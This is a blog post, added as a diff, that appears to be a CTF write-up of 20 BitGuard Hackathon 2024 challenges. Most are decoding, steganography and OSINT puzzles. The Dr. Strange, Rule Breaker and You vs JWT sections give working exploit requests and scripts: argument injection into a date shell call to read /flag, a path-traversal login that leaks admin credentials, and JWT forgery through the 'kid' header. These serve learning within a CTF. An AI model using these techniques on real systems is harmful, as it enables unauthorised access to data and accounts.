@@ -1,0 +1,303 @@
+---
+title: BitGuard Cybersecurity Hackathon 2024 Writeups
+description: Writeups for Bitguard Cybersecurity Hackathon 2024
+publishedDate: 2024-06-21
+author: kn1gh7
+tags:
+  - writeup
+---
+
+I recently participated in a CTF organized by Mercer | mettl. The CTF was for 2 weeks and had a total of 20 challenges. I was able to solve 19 of them and secured the first position. The overall level of the CTF was beginner to intermediate and I learnt some new things also.
+
+## Challenge-1: Introduction
+This was a simple sanity challenge. The flag was given in plaintext on the [linked website](https://mettl-bitguard-cybersecurity-hackathon.s3.us-east-2.amazonaws.com/intro.html).
+
+`FLAG: lag{this_is_an_example_flag}`
+## Challenge-2: Tic Tac Toe
+I went ahead to view the source of the page and found the following javascript code snippet
+```javascript
+// Function to encrypt the flag
+function encryptFlag(flag) {
+    let encryptedFlag = "";
+    for (let i = 0; i < flag.length; i++) {
+        let charCode = flag.charCodeAt(i);
+        encryptedFlag += String.fromCharCode(charCode + 1);
+    }
+    return encryptedFlag;
+}
+
+const encryptedFlag = "Gmbh|YPY`YPY`YPY`jt`fbtz~";
+```
+Clearly this was a simple function which took the original flag and shifted each character by increasing its ascii value by 1.
+I quickly opened a python shell to reverse it and got the flag.
+```python
+>>> enc = "Gmbh|YPY`YPY`YPY`jt`fbtz~"
+>>> "".join(chr(ord(i)-1) for i in enc)
+'Flag{XOX_XOX_XOX_is_easy}'
+```
+`FLAG: Flag{XOX_XOX_XOX_is_easy}`
+
+## Challenge-3: Connect 4
+This challenge was exactly similiar to the Challenge-2. Only the encrypted string was different.
+```python
+>>> enc = "Gmbh|DPOOFDU`NZ`%`GPSDF~"
+>>> "".join(chr(ord(i)-1) for i in enc)
+'Flag{CONNECT_MY_$_FORCE}'
+```
+`FLAG: Flag{CONNECT_MY_$_FORCE}`
+
+## Challenge-4: Brute ME
+Although the name suggested that the login had to be bruteforced, having no other information about the target I was reluctanct to do it as rockyou.txt contains 14 million passwords and even the username lists would contain  a few thousand. So I went on to ahead the source code - and what do you know? The flag was there in plainsight.
+
+`FLAG: Flag{Dolphin_is_not_the_password}`
+## Challenge-5: Android
+This was new to me. However, a quick google search gave me a [stackoverflow link](https://stackoverflow.com/a/28051161). I used the command and found the flag in the alias name.
+`COMMAND: keytool -list -v -keystore key.jks`
+
+`FLAG: flag{apk_is_mine}`
+## Challenge-6: ICANN
+The description stated TXT. My immediate thought was the TXT record of some domain. My first try was the domain on which the challenges were hosted. I used [nslookup.io](https://www.nslookup.io/txt-lookup/) to find the TXT record and found the flag.
+
+`FLAG: Flag{WHAT??_this_is_my_DNS}`
+## Challenge-7: Google
+Unable to solve this. However I am pretty sure that changing the User-Agent string to "Googlebot" should work and its probably an error on the organizer's side.
+## Challenge-8: i-Robot
+The name said it all. Went ahead to the [url](http://bitguard-env.eba-e5jrkwaj.ap-south-1.elasticbeanstalk.com/human) and went to `/robots.txt` endpoint. From there went ahead to `/what-about-my-flag-i-am-a-human` endpoint. The captcha image was not being rendered properly so I used python to make a request and get the image from `/captcha` endpoint. However, the rendering issue is fixed now so simply entering the captcha works.
+
+`FLAG: Flag{You_are_a_Noble_HUMAN}`
+## Challenge-9: BrainDuck
+Used the BrainF*ck compiler from [dcode.fr](https://www.dcode.fr/brainfuck-language) to get the flag.
+
+`FLAG: Flag{Brain_Duck_WTF}`
+
+## Challenge-10: URL
+The `page=3` parameter immediately caught my eye. I tried changing a few parameters and `page=0` worked.
+
+`FLAG: Flag{ZERO_based_indexing}`
+## Challenge-11: Country
+I put the hash on Virus total and in the [relations tab](https://www.virustotal.com/gui/file/129f0947a54c1f77f776da144babce4736184bf2d2972ef1aa2e7f22491ded05/relations) saw the url it connected to. Looked up the domain and it was an Indian tourist website. So I tried the flag with country as India and it worked.
+
+`FLAG: flag{india}`
+## Challenge-12: Maybach Shenanigans
+The file was a png file. I didn't find anything with basic tools like strings, exiftool, binwalk. So I decided to use zsteg for looking for lsb and I found a string.
+```
+B0sfERwRMA9DMxdLCgEAHgUDDBcX\n\naHR0cHM6Ly9tZXR0bC1iaXRndWFyZC1jeWJlcnNlY3VyaXR5LWhhY2thdGhvbi5zMy51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9lbmNyeXB0LnB5
+```
+I saw the 2 \n and removed them after adding new lines. The string after the \n turned out to be a base64 encoded [URL](https://mettl-bitguard-cybersecurity-hackathon.s3.us-east-2.amazonaws.com/encrypt.py). I downloaded the encrypt.py file and this was the code
+```python
+import base64
+from itertools import cycle
+
+def xor_encrypt(text, key):
+    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, cycle(key)))
+
+def transpose(text, step):
+    return text[step:] + text[:step]
+
+def encrypt(plaintext, key, step):
+    xor_result = xor_encrypt(plaintext, key)
+    
+    transposed_result = transpose(xor_result, step)
+    
+    encoded_result = base64.b64encode(transposed_result.encode()).decode()
+    
+    return encoded_result
+
+# Example usage
+plaintext = "This is a secret message"
+key = "complexkey"  #this is the key used for encryption even for the challenge, and not just for this example
+step = 5 
+
+encrypted_message = encrypt(plaintext, key, step)
+print("Encrypted message:", encrypted_message)
+```
+It was easy to reverse this as this was just simple XORing with the key and then slicing and shifting it. I quickly wrote a script to decrypt it and assumed that the first string in the original string would be the encrypted string. I got the flag from running the below script.
+```python
+import base64
+from itertools import cycle
+
+def xor_decrypt(text, key):
+    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, cycle(key)))
+
+def decrypt(ciphertext, key, step):
+    decoded_result = base64.b64decode(ciphertext.encode()).decode()
+    transposed_result = decoded_result[-step:] + decoded_result[:-step]
+    decrypted_result = xor_decrypt(transposed_result, key)
+    return decrypted_result
+
+ciphertext = "B0sfERwRMA9DMxdLCgEAHgUDDBcX"
+key = "complexkey"
+step = 5
+
+decrypted_message = decrypt(ciphertext, key, step)
+print("FLAG:", decrypted_message)
+```
+`FLAG: flag{b3tter_b3_r3ady}`
+## Challenge-13: QR Code
+The imgur mention and the code `87yIb4q` was enough to know that I have to go to some endpoint on imgur. I went to imgur, opened a random image and saw the endpoint. It is of the form `https://i.imgur.com/<image id>.jpeg`. I quickly put the image id and got the image from [there](https://imgur.com/87yIb4q). Scanned the QR code, got the [link](https://mettl-bitguard-cybersecurity-hackathon.s3.us-east-2.amazonaws.com/Flag.png) for the flag.
+
+`FLAG: Flag{aGVsbG8gd29ybGQ=}`
+## Challenge-14: GPay or OpSec
+The user `Joachim Odoacer` was given. I quickly searched him on popular social media and found an id with a qr code posted on instagram. There was also a base64 encoded string in bio of the user (which was basically a fake flag). The qr code lead to an audio file [url](https://mettl-bitguard-cybersecurity-hackathon.s3.us-east-2.amazonaws.com/gpay-2.mp3). Considering myself decently experienced in steganography I immediately started looking for common mp3 steganograhy. However, to my disappointment I didn't find anything. 
+The next day I googled for mp3 specific steganography tools where I came across [stegonaut](https://www.stegonaut.com/). This surprisingly gave me a base64 encoded string on putting the audio.
+`YClGL4hCYd+lAXjITDQT7stRmEc8pf3m+FaBURCCUpY=`
+This however on decoding gave gibberish which looked like an AES encoding. I looked for the key at a lot of places but didn't find anything. Finally, a hint was released which had the key - `4lw4ys_4ctiv4t3d_n3v3r_tr4c34bl3`.
+I used the key with [AES ECB](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Base64','string':'NGx3NHlzXzRjdGl2NHQzZF9uM3Yzcl90cjRjMzRibDM%3D'%7D,%7B'option':'Hex','string':''%7D,'ECB','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=YClGL4hCYd%2BlAXjITDQT7stRmEc8pf3m%2BFaBURCCUpY) to decrypt the text and got the flag.
+
+`FLAG: flag{sn0wd3n_is_happy}`
+## Challenge-15: Confusion
+I had no idea of what CRC was and how it worked so I left this chall for the end. When I came back I decided to go through a few articles based on CRC. The wikipedia article was really good and it became obvious that I just had to bruteforce the polynomial (the character of the flag in this case) which were only 127 values. So I wrote a script that did that and combined the result of the three files to remove the errors. The script printed the flag for me.
+```python
+# poly_size = 8 bit
+def crc(message, poly):
+    p = f'1{poly:08b}'
+    tmes = list(message + '0'*8)
+    for i in range(len(message)):
+        if tmes[i] == '1':
+            tmes[i] = '0'
+            for d in range(1,9):
+                if p[d] == '1':
+                    tmes[i+d] = f'{1-int(tmes[i+d])}'
+                
+    return "".join(tmes[-8:])
+
+def get_possible(file):
+    A = []
+    with open(file) as f:
+        for i in f.readlines():
+            a,r = i.strip().split(' --> ')
+            A.append((a,r))
+            # A[a] = r
+
+    poss = []
+
+
+    for i,j in A:
+        corr = [[],[]]
+        for x in range(0x7f):
+            if crc(i, x) == j: corr[0].append(x)
+            if crc(i[::-1], x) == j: corr[1].append(x)
+
+        poss.append(set(corr[0]))
+    return poss
+
+a = get_possible("./crc1.txt")
+b = get_possible("./crc2.txt")
+c = get_possible("./crc3.txt")
+
+ok = [chr((x&y&z).pop()) for x,y,z in zip(a,b,c)]
+print(*ok, sep='')
+```
+`FLAG: flag{did_we_detect_the_err0rs}`
+I liked this challenge as I got the most learning from this and it was good implementing the CRC myself after reading from wikipedia.
+## Challenge-16: Dr. Strange
+Probably my favourite challenge in the CTF.  The first thing was to understand the following exec command in php source code.
+```php
+$result = shell_exec("date '+" . escapeshellcmd($format) . "' 2>&1");
+```
+The only parameter we could change was format and fortunately it was not being sanitized. So I was sure that I have to exploit something from here.
+I understood that the following command runs on the server
+```bash
+date +'<format here>'
+```
+For a long time I kept thinking ways to execute `cat` command somehow but the `escapeshellcmd` function wouldn't allow me to do so. So I went ahead and opened the man page of date using `man page` and see if I could print a file using this and I did. The `-f` flag can open DATEFILE and read date from it, however if the file format was not DATEFILE, it would print the contents of the file as part of the error. I got it!
+So I carefully crafted a request to read the flag file (which btw had to be guessed where is) - turned out it was at /flag. 
+`format=' -f /flag'`
+I used this to first close the opening single quote, then read the file and then open the closing the single quote. I URL encoded it and sent the request to get the flag! Final request looked like this
+```http
+GET /?format=%27%20-f%20%2Fflag%27 HTTP/1.1
+Host: strange.kp7b0h3vueu5g.ap-south-1.cs.amazonlightsail.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Content-Length: 4
+```
+`FLAG: flag{1ts_t1me_t0_ge4r_up}`
+## Challenge-17: Tor
+Again a new challenge for me, but a google search sufficed. I searched for TOR relay fingerprint search and got the official link from The TOR Project.
+
+`FLAG: flag{94.130.89.176:9030}` 
+## Challenge-18: Rule Breaker
+As there was not much information given I started enumerating the application for endpoints etc. I saw the session cookie and tried to decrypt it using known methods but none worked. Then I started guessing username and password and to my surprise `guest` as both username and password worked. However, I was not able to find anything useful after logging in also. Then I started searching around google for related writeups like searching for `Cookie session CTF`, `avatar ctf` etc. Then when I searched `Avatar Viewer CTF`, I got a writeup from Harekaze mini CTF 2020. Turns out it was very similiar to the one we were given. I edited their solve script for our challenge and got the flag.
+```python
+import json
+import os
+import re
+import requests
+
+url = 'https://rule-breaker.kp7b0h3vueu5g.ap-south-1.cs.amazonlightsail.com/'
+
+# extract admin's password
+sess = requests.Session()
+sess.post(url + 'login', headers={
+  'Content-Type': 'application/json'
+}, data=json.dumps({
+  'username': ['../users.json'],
+  'password': None
+}))
+
+r = sess.get(url + 'myavatar.png')
+for username, password in r.json().items():
+  if username.startswith('admin'):
+    break
+
+# log in as admin
+sess.post(url + 'login', headers={
+  'Content-Type': 'application/json'
+}, data=json.dumps({
+  'username': [username],
+  'password': password
+}))
+
+r = sess.get(url + 'admin')
+print(r.text)
+```
+The printed result had the flag.
+I did not like this challenge as it turned out to be an OSINT challenge more than a web based challenge. The solve script needed more information than we were given and there was no way to solve this without the source code.
+
+`FLAG: flag{4dmin_l1k3s_c4ts}`
+## Challenge-19: S3
+I didn't have much experience with S3. So I started seeing general writeups based on S3 CTF challenges. Most of them were based on configuration based errors. I created an aws account and opened the console and the following command `aws s3 ls intentionally-vulnerable-bucket`gave me the list of all files on server. Voila!
+The endpoint `music_is_magic_magic_is_music.txt` seemed different so I went on it and got the flag.
+
+`FLAG: Flag{S3S3S3S3S3S3S3S3S3S--Symmetry--3S3S3S3S3S3S3S3S3S3S3S3}`
+
+## Challenge-20: You vs JWT
+On first look I tried a lot of JWT exploits. With nothing I started bruteforcing all known exploits with jwt_tool. Still when I got nothing, I knew that it cannot be done by known exploits and used some custom implementation which could not be known without the source code. As I had already experienced the same problem in Challenge-18, I again search for similiar challenge on google and I came across another similiar challenge from the same CTF (Harekaze mini CTF 2020). I again modified the solve script and got the flag. 
+```python
+import base64
+import hashlib
+import hmac
+import json
+import os
+import re
+import requests
+
+url = 'https://jwt.kp7b0h3vueu5g.ap-south-1.cs.amazonlightsail.com/'
+
+def b64encode(obj):
+  return base64.urlsafe_b64encode(obj).replace(b'=', b'')
+
+# Generating JWT
+header = {
+  'typ': 'JWT',
+  'kid': './.htaccess',
+  'alg': 'HS256'
+}
+data = {
+  'username': 'admin',
+  'role': 'admin'
+}
+secret = b'deny from all'
+
+signing_input = b64encode(json.dumps(header).encode()) + b'.' + b64encode(json.dumps(data).encode())
+signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
+jwt = signing_input + b'.' + b64encode(signature)
+
+# Go!
+r = requests.get(url + '?page=admin', cookies={
+  'jwtsession': jwt.decode()
+})
+print(r.text)
+``` 
+The script used LFI which I tried and knew that default apache config files could be used. But the value inside them cannot be accessed by the user so there was no way to sign the jwt token that way. Therefore, in this challenge also, the source code or atleast some php configuration files should have been provided in order for us to know the value to be signed with. Thus this chall also turned out to be more of an OSINT chall than a web chall.
+
+`FLAG: flag{so_y0u_found_m3}`
